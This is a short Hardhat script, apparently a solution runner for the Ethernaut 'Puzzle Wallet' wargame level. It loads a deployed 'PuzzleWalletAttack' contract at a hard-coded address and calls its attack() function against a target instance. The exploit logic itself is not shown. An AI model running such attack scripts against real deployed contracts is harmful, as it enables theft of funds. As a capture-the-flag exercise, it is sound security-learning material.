const { ethers } = require("hardhat");

const ATTACKER_ADDRESS = "0x96432167F34091D1e8DdCaF48e0ca9977b98eE6f";
const INSTANCE_ADDRESS = "0xd73AccECa5d3792cA8c826cB9E93593df9cB8212";

async function main() {
    const puzzleWalletAttacker = await ethers.getContractAt("PuzzleWalletAttack", ATTACKER_ADDRESS);

    // Execute the attack.
    const transferTx = await puzzleWalletAttacker.attack({gasLimit: 1000000});
    const attackReceipt = await transferTx.wait();
    console.log("attackReceipt: ", attackReceipt);


}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});